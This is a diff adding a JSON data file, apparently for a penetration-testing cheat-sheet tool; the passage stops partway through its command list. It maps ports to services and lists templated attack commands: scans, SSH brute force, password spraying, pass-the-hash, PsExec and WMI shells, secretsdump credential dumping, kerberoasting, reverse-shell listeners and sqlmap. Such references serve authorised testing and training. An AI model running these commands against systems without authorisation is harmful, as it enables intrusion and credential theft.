@@ -1,0 +1,1485 @@
+{
+  "vars": [
+    "IP",
+    "DOMAIN",
+    "DC_IP",
+    "USER",
+    "PASS",
+    "HASH",
+    "LHOST",
+    "LPORT",
+    "PORTS",
+    "WORDLIST"
+  ],
+  "phases": [
+    "recon",
+    "enum",
+    "access",
+    "privesc",
+    "lateral",
+    "web",
+    "post"
+  ],
+  "services": {
+    "21": "FTP",
+    "22": "SSH",
+    "25": "SMTP",
+    "53": "DNS",
+    "69": "TFTP",
+    "79": "Finger",
+    "80": "HTTP",
+    "88": "Kerberos",
+    "110": "POP3",
+    "111": "NFS",
+    "135": "MSRPC",
+    "139": "NetBIOS",
+    "143": "IMAP",
+    "161": "SNMP",
+    "389": "LDAP",
+    "443": "HTTPS",
+    "445": "SMB",
+    "636": "LDAPS",
+    "873": "rsync",
+    "1433": "MSSQL",
+    "1521": "Oracle",
+    "2049": "NFS",
+    "2375": "Docker",
+    "3000": "Grafana",
+    "3268": "GlobalCat",
+    "3306": "MySQL",
+    "3389": "RDP",
+    "5432": "Postgres",
+    "5900": "VNC",
+    "5985": "WinRM",
+    "5986": "WinRM/S",
+    "6379": "Redis",
+    "8000": "HTTP-alt",
+    "8080": "HTTP-alt",
+    "8089": "Splunk",
+    "8443": "HTTPS-alt",
+    "9200": "Elastic",
+    "10000": "Webmin",
+    "11211": "Memcache",
+    "27017": "MongoDB"
+  },
+  "aliases": {
+    "ftp": 21,
+    "ssh": 22,
+    "smtp": 25,
+    "dns": 53,
+    "domain": 53,
+    "http": 80,
+    "https": 443,
+    "ssl": 443,
+    "kerberos": 88,
+    "kerberos-sec": 88,
+    "pop3": 110,
+    "nfs": 111,
+    "rpcbind": 111,
+    "msrpc": 135,
+    "netbios": 139,
+    "netbios-ssn": 139,
+    "imap": 143,
+    "snmp": 161,
+    "ldap": 389,
+    "microsoft-ds": 445,
+    "smb": 445,
+    "ldaps": 636,
+    "mssql": 1433,
+    "ms-sql-s": 1433,
+    "global catalog": 3268,
+    "mysql": 3306,
+    "rdp": 3389,
+    "ms-wbt-server": 3389,
+    "postgres": 5432,
+    "postgresql": 5432,
+    "winrm": 5985,
+    "wsman": 5985,
+    "redis": 6379,
+    "tftp": 69,
+    "finger": 79,
+    "rsync": 873,
+    "oracle": 1521,
+    "oracle-tns": 1521,
+    "docker": 2375,
+    "grafana": 3000,
+    "vnc": 5900,
+    "http-proxy": 8080,
+    "http-alt": 8080,
+    "splunk": 8089,
+    "splunkd": 8089,
+    "elasticsearch": 9200,
+    "webmin": 10000,
+    "memcached": 11211,
+    "memcache": 11211,
+    "mongodb": 27017,
+    "mongo": 27017
+  },
+  "entries": [
+    {
+      "id": "e0",
+      "phase": "recon",
+      "category": "Port scanning",
+      "title": "Full TCP port sweep",
+      "cmd": "nmap -p- --min-rate 1000 -T4 {{IP}}",
+      "note": "Fast pass over all 65535 ports to find what is open.",
+      "tags": [
+        "net"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/"
+      }
+    },
+    {
+      "id": "e1",
+      "phase": "recon",
+      "category": "Port scanning",
+      "title": "Service & script scan",
+      "cmd": "nmap -sC -sV -p{{PORTS}} {{IP}} -oN nmap.txt",
+      "note": "Versions and default scripts on the open ports — paste this into Scan mode.",
+      "tags": [
+        "net"
+      ],
+      "ports": [],
+      "source": {
+        "title": "nmap",
+        "url": "https://nmap.org/book/man-briefoptions.html"
+      }
+    },
+    {
+      "id": "e2",
+      "phase": "recon",
+      "category": "Port scanning",
+      "title": "Rustscan → nmap",
+      "cmd": "rustscan -a {{IP}} -- -sC -sV",
+      "note": "Very fast discovery that pipes straight into nmap.",
+      "tags": [
+        "net"
+      ],
+      "ports": [],
+      "source": {
+        "title": "RustScan",
+        "url": "https://github.com/RustScan/RustScan"
+      }
+    },
+    {
+      "id": "e3",
+      "phase": "recon",
+      "category": "Port scanning",
+      "title": "Top UDP services",
+      "cmd": "nmap -sU --top-ports 20 {{IP}}",
+      "note": "Catches SNMP, DNS, TFTP and other UDP-only services.",
+      "tags": [
+        "net"
+      ],
+      "ports": [],
+      "source": {
+        "title": "nmap",
+        "url": "https://nmap.org/book/scan-methods-udp-scan.html"
+      }
+    },
+    {
+      "id": "e4",
+      "phase": "recon",
+      "category": "Host discovery",
+      "title": "Live hosts on a subnet",
+      "cmd": "nmap -sn {{IP}}/24",
+      "note": "Ping sweep to map which hosts answer on the network.",
+      "tags": [
+        "net"
+      ],
+      "ports": [],
+      "source": {
+        "title": "nmap",
+        "url": "https://nmap.org/book/host-discovery.html"
+      }
+    },
+    {
+      "id": "e5",
+      "phase": "enum",
+      "category": "FTP",
+      "title": "Anonymous login",
+      "cmd": "ftp {{IP}}",
+      "note": "Try anonymous / anonymous and look for readable files.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        21
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/"
+      }
+    },
+    {
+      "id": "e6",
+      "phase": "enum",
+      "category": "FTP",
+      "title": "Mirror everything",
+      "cmd": "wget -r ftp://anonymous:anonymous@{{IP}}/",
+      "note": "Recursively pull all files the anonymous user can read.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        21
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/"
+      }
+    },
+    {
+      "id": "e7",
+      "phase": "access",
+      "category": "SSH",
+      "title": "Log in",
+      "cmd": "ssh {{USER}}@{{IP}}",
+      "note": "Straight login once you have a username and password.",
+      "tags": [
+        "linux",
+        "net"
+      ],
+      "ports": [
+        22
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html"
+      }
+    },
+    {
+      "id": "e8",
+      "phase": "access",
+      "category": "SSH",
+      "title": "Brute / spray login",
+      "cmd": "hydra -l {{USER}} -P {{WORDLIST}} {{IP}} ssh",
+      "note": "Test one user against a wordlist (also works on ftp, http-form, etc).",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        22
+      ],
+      "source": {
+        "title": "Hydra",
+        "url": "https://github.com/vanhauser-thc/thc-hydra"
+      }
+    },
+    {
+      "id": "e9",
+      "phase": "privesc",
+      "category": "SSH",
+      "title": "Crack a key passphrase",
+      "cmd": "ssh2john id_rsa > hash && john hash",
+      "note": "Recover the passphrase on a private key you looted.",
+      "tags": [
+        "any"
+      ],
+      "ports": [
+        22
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ssh.html"
+      }
+    },
+    {
+      "id": "e10",
+      "phase": "enum",
+      "category": "SMTP",
+      "title": "User enumeration",
+      "cmd": "nc {{IP}} 25   # then: VRFY {{USER}}",
+      "note": "VRFY / RCPT TO often confirm which users exist.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        25
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/"
+      }
+    },
+    {
+      "id": "e11",
+      "phase": "enum",
+      "category": "DNS",
+      "title": "Zone transfer",
+      "cmd": "dig axfr {{DOMAIN}} @{{IP}}",
+      "note": "A misconfigured server hands over every record at once.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        53
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-dns.html"
+      }
+    },
+    {
+      "id": "e12",
+      "phase": "enum",
+      "category": "Web content",
+      "title": "Directory brute force",
+      "cmd": "feroxbuster -u http://{{IP}} -w {{WORDLIST}}",
+      "note": "Recursively find hidden directories and files.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        80,
+        443,
+        8000,
+        8080,
+        8443
+      ],
+      "source": {
+        "title": "feroxbuster",
+        "url": "https://github.com/epi052/feroxbuster"
+      }
+    },
+    {
+      "id": "e13",
+      "phase": "enum",
+      "category": "Web content",
+      "title": "Fingerprint the stack",
+      "cmd": "whatweb http://{{IP}}",
+      "note": "Identify the server, CMS, frameworks and versions.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        80,
+        443,
+        8000,
+        8080,
+        8443
+      ],
+      "source": {
+        "title": "WhatWeb",
+        "url": "https://github.com/urbanadventurer/WhatWeb"
+      }
+    },
+    {
+      "id": "e14",
+      "phase": "enum",
+      "category": "Web content",
+      "title": "Virtual host discovery",
+      "cmd": "ffuf -u http://{{IP}} -H \"Host: FUZZ.{{DOMAIN}}\" -w {{WORDLIST}} -fs 0",
+      "note": "Reveal name-based vhosts hidden behind one IP.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        80,
+        443
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/"
+      }
+    },
+    {
+      "id": "e15",
+      "phase": "enum",
+      "category": "Web content",
+      "title": "Misconfig scan",
+      "cmd": "nikto -h http://{{IP}}",
+      "note": "Quick sweep for known server misconfigurations.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        80,
+        443,
+        8000,
+        8080,
+        8443
+      ],
+      "source": {
+        "title": "Nikto",
+        "url": "https://github.com/sullo/nikto"
+      }
+    },
+    {
+      "id": "e16",
+      "phase": "enum",
+      "category": "Web content",
+      "title": "WordPress enumeration",
+      "cmd": "wpscan --url http://{{IP}} --enumerate u,vp",
+      "note": "Enumerate WordPress users and vulnerable plugins.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        80,
+        443
+      ],
+      "source": {
+        "title": "WPScan",
+        "url": "https://github.com/wpscanteam/wpscan"
+      }
+    },
+    {
+      "id": "e17",
+      "phase": "enum",
+      "category": "Web content",
+      "title": "Inspect TLS",
+      "cmd": "sslscan {{IP}}:443",
+      "note": "Weak ciphers and cert details sometimes leak hostnames.",
+      "tags": [
+        "web"
+      ],
+      "ports": [
+        443
+      ],
+      "source": {
+        "title": "testssl.sh",
+        "url": "https://testssl.sh/"
+      }
+    },
+    {
+      "id": "e18",
+      "phase": "enum",
+      "category": "Kerberos",
+      "title": "Validate usernames",
+      "cmd": "kerbrute userenum -d {{DOMAIN}} --dc {{DC_IP}} {{WORDLIST}}",
+      "note": "Confirm which usernames exist without locking accounts.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        88
+      ],
+      "source": {
+        "title": "kerbrute",
+        "url": "https://github.com/ropnop/kerbrute"
+      }
+    },
+    {
+      "id": "e19",
+      "phase": "lateral",
+      "category": "Kerberos",
+      "title": "AS-REP roasting",
+      "cmd": "impacket-GetNPUsers {{DOMAIN}}/ -usersfile users.txt -dc-ip {{DC_IP}} -no-pass",
+      "note": "Accounts without pre-auth hand out crackable hashes.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        88
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html"
+      }
+    },
+    {
+      "id": "e20",
+      "phase": "lateral",
+      "category": "Kerberos",
+      "title": "Kerberoasting",
+      "cmd": "impacket-GetUserSPNs {{DOMAIN}}/{{USER}}:{{PASS}} -dc-ip {{DC_IP}} -request",
+      "note": "Service-account tickets you can crack offline.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        88
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberoast.html"
+      }
+    },
+    {
+      "id": "e21",
+      "phase": "enum",
+      "category": "NFS",
+      "title": "List exports",
+      "cmd": "showmount -e {{IP}}",
+      "note": "See which shares are exported, then mount them locally.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        111,
+        2049
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/nfs-service-pentesting.html"
+      }
+    },
+    {
+      "id": "e22",
+      "phase": "enum",
+      "category": "MSRPC",
+      "title": "Dump RPC endpoints",
+      "cmd": "impacket-rpcdump {{IP}}",
+      "note": "Map the exposed RPC services on the host.",
+      "tags": [
+        "windows",
+        "ad"
+      ],
+      "ports": [
+        135
+      ],
+      "source": {
+        "title": "Impacket",
+        "url": "https://github.com/fortra/impacket"
+      }
+    },
+    {
+      "id": "e23",
+      "phase": "lateral",
+      "category": "MSRPC",
+      "title": "Command exec (WMI)",
+      "cmd": "impacket-wmiexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",
+      "note": "Semi-interactive shell over WMI, no service created.",
+      "tags": [
+        "windows",
+        "ad"
+      ],
+      "ports": [
+        135
+      ],
+      "source": {
+        "title": "Impacket",
+        "url": "https://github.com/fortra/impacket"
+      }
+    },
+    {
+      "id": "e24",
+      "phase": "enum",
+      "category": "SMB",
+      "title": "List shares (null session)",
+      "cmd": "smbclient -L //{{IP}} -N",
+      "note": "Try to list shares with no credentials.",
+      "tags": [
+        "windows",
+        "net"
+      ],
+      "ports": [
+        139,
+        445
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/"
+      }
+    },
+    {
+      "id": "e25",
+      "phase": "enum",
+      "category": "SMB",
+      "title": "enum4linux-ng",
+      "cmd": "enum4linux-ng -A {{IP}}",
+      "note": "Users, groups, shares and OS info over SMB/RPC.",
+      "tags": [
+        "windows",
+        "net"
+      ],
+      "ports": [
+        139,
+        445
+      ],
+      "source": {
+        "title": "enum4linux-ng",
+        "url": "https://github.com/cddmp/enum4linux-ng"
+      }
+    },
+    {
+      "id": "e26",
+      "phase": "enum",
+      "category": "SMB",
+      "title": "Shares & access (NetExec)",
+      "cmd": "netexec smb {{IP}} -u '{{USER}}' -p '{{PASS}}' --shares",
+      "note": "Enumerate shares and read/write access.",
+      "tags": [
+        "windows",
+        "ad"
+      ],
+      "ports": [
+        445
+      ],
+      "source": {
+        "title": "NetExec",
+        "url": "https://www.netexec.wiki/"
+      }
+    },
+    {
+      "id": "e27",
+      "phase": "lateral",
+      "category": "SMB",
+      "title": "Password spray",
+      "cmd": "netexec smb {{IP}} -u users.txt -p '{{PASS}}' --continue-on-success",
+      "note": "One password against many users across hosts.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        445
+      ],
+      "source": {
+        "title": "NetExec",
+        "url": "https://www.netexec.wiki/"
+      }
+    },
+    {
+      "id": "e28",
+      "phase": "lateral",
+      "category": "SMB",
+      "title": "Pass-the-hash",
+      "cmd": "netexec smb {{IP}} -u {{USER}} -H {{HASH}}",
+      "note": "Authenticate with an NTLM hash, no cleartext password.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        445
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/ntlm/"
+      }
+    },
+    {
+      "id": "e29",
+      "phase": "lateral",
+      "category": "SMB",
+      "title": "Shell via PsExec",
+      "cmd": "impacket-psexec {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",
+      "note": "SYSTEM shell when the user is a local admin.",
+      "tags": [
+        "windows",
+        "ad"
+      ],
+      "ports": [
+        445
+      ],
+      "source": {
+        "title": "Impacket",
+        "url": "https://github.com/fortra/impacket"
+      }
+    },
+    {
+      "id": "e30",
+      "phase": "lateral",
+      "category": "SMB",
+      "title": "Dump secrets (with admin)",
+      "cmd": "impacket-secretsdump {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}}",
+      "note": "Pull local or domain hashes once you have admin.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        445
+      ],
+      "source": {
+        "title": "Impacket",
+        "url": "https://github.com/fortra/impacket"
+      }
+    },
+    {
+      "id": "e31",
+      "phase": "enum",
+      "category": "SNMP",
+      "title": "Walk the tree",
+      "cmd": "snmpwalk -v2c -c public {{IP}}",
+      "note": "Default 'public' community string often leaks a lot.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        161
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-snmp/"
+      }
+    },
+    {
+      "id": "e32",
+      "phase": "enum",
+      "category": "LDAP",
+      "title": "Anonymous bind search",
+      "cmd": "ldapsearch -x -H ldap://{{IP}} -b \"DC=…\" ",
+      "note": "Dump directory objects if anonymous binds are allowed.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        389,
+        3268
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html"
+      }
+    },
+    {
+      "id": "e33",
+      "phase": "enum",
+      "category": "LDAP",
+      "title": "Enumerate users (RPC)",
+      "cmd": "rpcclient -U '' -N {{IP}} -c enumdomusers",
+      "note": "List domain users over a null RPC session.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        389
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rpc/"
+      }
+    },
+    {
+      "id": "e34",
+      "phase": "lateral",
+      "category": "LDAP",
+      "title": "Map the domain (BloodHound)",
+      "cmd": "bloodhound-python -d {{DOMAIN}} -u {{USER}} -p {{PASS}} -c all -ns {{DC_IP}}",
+      "note": "Collect the AD graph to find attack paths to Domain Admin.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        389
+      ],
+      "source": {
+        "title": "BloodHound",
+        "url": "https://bloodhound.specterops.io/"
+      }
+    },
+    {
+      "id": "e35",
+      "phase": "lateral",
+      "category": "MSSQL",
+      "title": "Connect",
+      "cmd": "impacket-mssqlclient {{DOMAIN}}/{{USER}}:{{PASS}}@{{IP}} -windows-auth",
+      "note": "Authenticated SQL shell; try enable_xp_cmdshell for exec.",
+      "tags": [
+        "windows",
+        "ad"
+      ],
+      "ports": [
+        1433
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/"
+      }
+    },
+    {
+      "id": "e36",
+      "phase": "enum",
+      "category": "MSSQL",
+      "title": "Check access (NetExec)",
+      "cmd": "netexec mssql {{IP}} -u {{USER}} -p {{PASS}}",
+      "note": "Validate creds and privileges against MSSQL.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        1433
+      ],
+      "source": {
+        "title": "NetExec",
+        "url": "https://www.netexec.wiki/"
+      }
+    },
+    {
+      "id": "e37",
+      "phase": "enum",
+      "category": "MySQL",
+      "title": "Connect",
+      "cmd": "mysql -h {{IP}} -u {{USER}} -p",
+      "note": "Weak or reused DB creds often open the box.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        3306
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html"
+      }
+    },
+    {
+      "id": "e38",
+      "phase": "enum",
+      "category": "PostgreSQL",
+      "title": "Connect",
+      "cmd": "psql -h {{IP}} -U {{USER}}",
+      "note": "Default postgres / postgres is worth a try.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        5432
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html"
+      }
+    },
+    {
+      "id": "e39",
+      "phase": "enum",
+      "category": "Redis",
+      "title": "Connect unauthenticated",
+      "cmd": "redis-cli -h {{IP}}",
+      "note": "Open Redis can leak data or be abused to write files.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        6379
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-redis.html"
+      }
+    },
+    {
+      "id": "e40",
+      "phase": "lateral",
+      "category": "RDP",
+      "title": "Connect",
+      "cmd": "xfreerdp /v:{{IP}} /u:{{USER}} /p:{{PASS}} +clipboard",
+      "note": "Graphical session once you have valid creds.",
+      "tags": [
+        "windows"
+      ],
+      "ports": [
+        3389
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html"
+      }
+    },
+    {
+      "id": "e41",
+      "phase": "lateral",
+      "category": "WinRM",
+      "title": "Shell (Evil-WinRM)",
+      "cmd": "evil-winrm -i {{IP}} -u {{USER}} -p {{PASS}}",
+      "note": "Interactive shell when the user is in Remote Management Users.",
+      "tags": [
+        "ad",
+        "windows"
+      ],
+      "ports": [
+        5985,
+        5986
+      ],
+      "source": {
+        "title": "Evil-WinRM",
+        "url": "https://github.com/Hackplayers/evil-winrm"
+      }
+    },
+    {
+      "id": "e42",
+      "phase": "enum",
+      "category": "WinRM",
+      "title": "Check access (NetExec)",
+      "cmd": "netexec winrm {{IP}} -u {{USER}} -p {{PASS}}",
+      "note": "'(Pwn3d!)' means you can get a shell here.",
+      "tags": [
+        "ad"
+      ],
+      "ports": [
+        5985,
+        5986
+      ],
+      "source": {
+        "title": "NetExec",
+        "url": "https://www.netexec.wiki/"
+      }
+    },
+    {
+      "id": "e43",
+      "phase": "access",
+      "category": "Finding exploits",
+      "title": "Search public exploits",
+      "cmd": "searchsploit <product> <version>",
+      "note": "Look up known exploits for a service name and version.",
+      "tags": [
+        "any"
+      ],
+      "ports": [],
+      "source": {
+        "title": "Exploit-DB",
+        "url": "https://www.exploit-db.com/searchsploit"
+      }
+    },
+    {
+      "id": "e44",
+      "phase": "access",
+      "category": "Shells",
+      "title": "Start a listener",
+      "cmd": "nc -lvnp {{LPORT}}",
+      "note": "Catch an incoming reverse shell.",
+      "tags": [
+        "any"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/linux.html"
+      }
+    },
+    {
+      "id": "e45",
+      "phase": "access",
+      "category": "Shells",
+      "title": "Upgrade to a full TTY",
+      "cmd": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+      "note": "Then Ctrl-Z, stty raw -echo, fg — turns a dumb shell interactive.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/generic-methodologies-and-resources/shells/full-ttys.html"
+      }
+    },
+    {
+      "id": "e46",
+      "phase": "access",
+      "category": "Shells",
+      "title": "Reverse shell generator",
+      "cmd": "# build one for {{LHOST}}:{{LPORT}} → revshells.com",
+      "note": "Reference site that writes a reverse shell in many languages.",
+      "tags": [
+        "any"
+      ],
+      "ports": [],
+      "source": {
+        "title": "revshells.com",
+        "url": "https://www.revshells.com/"
+      }
+    },
+    {
+      "id": "e47",
+      "phase": "privesc",
+      "category": "Linux",
+      "title": "Sudo rights",
+      "cmd": "sudo -l",
+      "note": "What can this user run as root? Check each binary on GTFOBins.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [],
+      "source": {
+        "title": "GTFOBins",
+        "url": "https://gtfobins.github.io/"
+      }
+    },
+    {
+      "id": "e48",
+      "phase": "privesc",
+      "category": "Linux",
+      "title": "SUID binaries",
+      "cmd": "find / -perm -4000 -type f 2>/dev/null",
+      "note": "Root-owned SUID files; cross-reference GTFOBins.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [],
+      "source": {
+        "title": "GTFOBins",
+        "url": "https://gtfobins.github.io/"
+      }
+    },
+    {
+      "id": "e49",
+      "phase": "privesc",
+      "category": "Linux",
+      "title": "Automated enum (linPEAS)",
+      "cmd": "./linpeas.sh",
+      "note": "Highlights likely Linux privilege-escalation paths.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [],
+      "source": {
+        "title": "PEASS-ng",
+        "url": "https://github.com/peass-ng/PEASS-ng"
+      }
+    },
+    {
+      "id": "e50",
+      "phase": "privesc",
+      "category": "Linux",
+      "title": "Capabilities",
+      "cmd": "getcap -r / 2>/dev/null",
+      "note": "Binaries with capabilities like cap_setuid can grant root.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html"
+      }
+    },
+    {
+      "id": "e51",
+      "phase": "privesc",
+      "category": "Linux",
+      "title": "Cron jobs",
+      "cmd": "cat /etc/crontab; ls -la /etc/cron.*",
+      "note": "Writable scripts run on a schedule as root.",
+      "tags": [
+        "linux"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/"
+      }
+    },
+    {
+      "id": "e52",
+      "phase": "privesc",
+      "category": "Windows",
+      "title": "Token privileges",
+      "cmd": "whoami /priv",
+      "note": "SeImpersonate / SeAssignPrimaryToken enable the Potato attacks.",
+      "tags": [
+        "windows"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/"
+      }
+    },
+    {
+      "id": "e53",
+      "phase": "privesc",
+      "category": "Windows",
+      "title": "Automated enum (winPEAS)",
+      "cmd": "winpeas.exe",
+      "note": "Highlights likely Windows privilege-escalation paths.",
+      "tags": [
+        "windows"
+      ],
+      "ports": [],
+      "source": {
+        "title": "PEASS-ng",
+        "url": "https://github.com/peass-ng/PEASS-ng"
+      }
+    },
+    {
+      "id": "e54",
+      "phase": "privesc",
+      "category": "Windows",
+      "title": "OS build for kernel exploits",
+      "cmd": "systeminfo",
+      "note": "Feed the build number to wesng to match missing patches.",
+      "tags": [
+        "windows"
+      ],
+      "ports": [],
+      "source": {
+        "title": "wesng",
+        "url": "https://github.com/bitsadmin/wesng"
+      }
+    },
+    {
+      "id": "e55",
+      "phase": "privesc",
+      "category": "Windows",
+      "title": "Weak service permissions",
+      "cmd": "wmic service get name,pathname,startmode",
+      "note": "Unquoted paths and writable service binaries.",
+      "tags": [
+        "windows"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/"
+      }
+    },
+    {
+      "id": "e56",
+      "phase": "privesc",
+      "category": "Windows",
+      "title": "Stored credentials",
+      "cmd": "cmdkey /list",
+      "note": "Saved creds can be reused with runas /savecred.",
+      "tags": [
+        "windows"
+      ],
+      "ports": [],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/"
+      }
+    },
+    {
+      "id": "e57",
+      "phase": "web",
+      "category": "Injection",
+      "title": "SQL injection (sqlmap)",
+      "cmd": "sqlmap -u \"http://{{IP}}/?id=1\" --batch --dbs",
+      "note": "Detect and exploit SQLi, then enumerate databases.",
+      "tags": [
+        "web"
+      ],
+      "ports": [],
+      "source": {
+        "title": "sqlmap",
+        "url": "https://github.com/sqlmapproject/sqlmap/wiki"
+      }
+    },
+    {
+      "id": "e58",
+      "phase": "web",
+      "category": "Injection",
+      "title": "Payload reference",
+      "cmd": "# LFI / SSTI / XSS / SQLi → PayloadsAllTheThings",
+      "note": "Curated, categorised payloads for almost every web bug class.",
+      "tags": [
+        "web"
+      ],
+      "ports": [],
+      "source": {
+        "title": "PayloadsAllTheThings",
+        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings"
+      }
+    },
+    {
+      "id": "e59",
+      "phase": "web",
+      "category": "Discovery",
+      "title": "Hidden parameters",
+      "cmd": "ffuf -u \"http://{{IP}}/?FUZZ=test\" -w {{WORDLIST}} -fs 0",
+      "note": "Find undocumented GET/POST parameters.",
+      "tags": [
+        "web"
+      ],
+      "ports": [],
+      "source": {
+        "title": "ffuf",
+        "url": "https://github.com/ffuf/ffuf/wiki"
+      }
+    },
+    {
+      "id": "e60",
+      "phase": "web",
+      "category": "Manual testing",
+      "title": "Intercept & replay",
+      "cmd": "# Burp Suite → Proxy → Repeater",
+      "note": "The core manual loop: intercept, tamper, resend.",
+      "tags": [
+        "web"
+      ],
+      "ports": [],
+      "source": {
+        "title": "PortSwigger",
+        "url": "https://portswigger.net/web-security"
+      }
+    },
+    {
+      "id": "e61",
+      "phase": "enum",
+      "category": "TFTP",
+      "title": "Grab a file",
+      "cmd": "tftp {{IP}} -c get <file>",
+      "note": "No auth; pull known filenames (configs, backups).",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        69
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/69-udp-tftp.html"
+      }
+    },
+    {
+      "id": "e62",
+      "phase": "enum",
+      "category": "Finger",
+      "title": "User enumeration",
+      "cmd": "finger @{{IP}}",
+      "note": "Lists valid / logged-in users on old Unix hosts.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        79
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-finger.html"
+      }
+    },
+    {
+      "id": "e63",
+      "phase": "enum",
+      "category": "POP3 / IMAP",
+      "title": "Read mail",
+      "cmd": "nc {{IP}} 110   # USER {{USER}} / PASS {{PASS}}",
+      "note": "Mailboxes often hold creds and hints.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        110,
+        143
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html"
+      }
+    },
+    {
+      "id": "e64",
+      "phase": "enum",
+      "category": "rsync",
+      "title": "List modules",
+      "cmd": "rsync -av rsync://{{IP}}/",
+      "note": "Open rsync shares can expose or receive files.",
+      "tags": [
+        "net"
+      ],
+      "ports": [
+        873
+      ],
+      "source": {
+        "title": "HackTricks",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html"
+      }
+    },
